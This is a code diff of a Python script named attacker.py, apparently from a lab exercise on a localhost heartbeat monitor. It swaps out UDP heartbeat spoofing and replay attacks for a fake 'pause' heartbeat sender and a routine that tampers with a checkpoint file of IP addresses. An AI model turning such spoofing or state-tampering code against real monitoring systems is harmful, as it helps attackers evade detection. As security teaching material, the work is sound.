@@ -1,63 +1,69 @@
+import json
 import socket
 import time
 import sys
+import shutil
+from pathlib import Path
+
+HOST = "127.0.0.1"
+SENTINEL_SCRIPT = "sentinel.py"
+CHECKPOINT = Path.cwd() / "checkpoint.json"
+VICTIM_PORT = 5000
 
 # Attack 1
-# Function to send a heartbeat message over UDP
-def send_heartbeat():
-    # Creates a UDP socket for sending the heartbeat message
-    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as heartbeat_socket:
+def delay_heartbeat():
+
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sender:
         while True:
-            # Sends a heartbeat message to the specified IP address and port
-            # to indicate that the sender is alive
-            heartbeat_socket.sendto(b"HEARTBEAT", ("127.0.0.1", 5001))
+            message = b"PAUSE_HEARTBEAT"
+            # Sends the fake heartbeat message to the specified IP address and port
+            sender.sendto(message, ("127.0.0.1", VICTIM_PORT))
 
-            #print("Heartbeat sent")
+            print("Sent delay:", message)
 
-            time.sleep(1)  # Wait for 1 seconds before sending the next heartbeat
+            time.sleep(30)
 
 # Attack 2
-def replay_heartbeat():
+def tampered_checkpoint():
+    """Back up the original checkpoint, then add a test entry to the state."""
+    original_copy = CHECKPOINT.with_name(f"{CHECKPOINT.stem}.original{CHECKPOINT.suffix}")
 
-    # Captures a legitimate heartbeat
-    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as receiver:
-        # Receiver socket for capturing the heartbeat message
-        receiver.bind(("127.0.0.1", 5001))
+    try:
+        shutil.copy2(CHECKPOINT, original_copy)
+        state = json.loads(CHECKPOINT.read_text(encoding="utf-8"))
+    except (OSError, json.JSONDecodeError) as error:
+        raise SystemExit(f"Cannot read {CHECKPOINT}: {error}")
 
-        print("Waiting to capture a heartbeat...")
+    if not isinstance(state, list) or not all(isinstance(item, str) for item in state):
+        raise SystemExit("Checkpoint must contain a JSON list of IP strings")
 
-        message, address = receiver.recvfrom(1024)
+    if HOST not in state:
+        state.append(HOST)
 
-        print("Captured heartbeat:", message)
+    temp_path = CHECKPOINT.with_suffix(".json.tmp")
+    temp_path.write_text(json.dumps(state), encoding="utf-8")
+    temp_path.replace(CHECKPOINT)
+    print(
+        f"Saved original checkpoint to {original_copy}; "
+        f"tampered checkpoint by adding {HOST}."
+    )
 
-    # The receiving socket is now closed
-    input("Start the monitor, then press Enter to replay...")
 
-    # Replays the captured heartbeat
-    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sender:
-
-        while True:
-            # Sends the captured heartbeat message to the specified IP address and port
-            sender.sendto(message, ("127.0.0.1", 5001))
-
-            print("Replayed heartbeat:", message)
-
-            time.sleep(1)
 
 if __name__ == "__main__":
     
     try:
         if len(sys.argv) != 2:
-            print("Usage: python attacker.py spoof | replay")
+            print("Usage: python attacker.py delay | tamper")
 
-        elif sys.argv[1] == "spoof":
-            send_heartbeat()
+        elif sys.argv[1] == "delay":
+            delay_heartbeat()
 
-        elif sys.argv[1] == "replay":
-            replay_heartbeat()
+        elif sys.argv[1] == "tamper":
+            tampered_checkpoint()
 
         else:
-            print("Invalid attack. Choose 'spoof' or 'replay'.")
+            print("Invalid attack. Choose 'delay' or 'tamper'.")
 
     except KeyboardInterrupt:
         pass
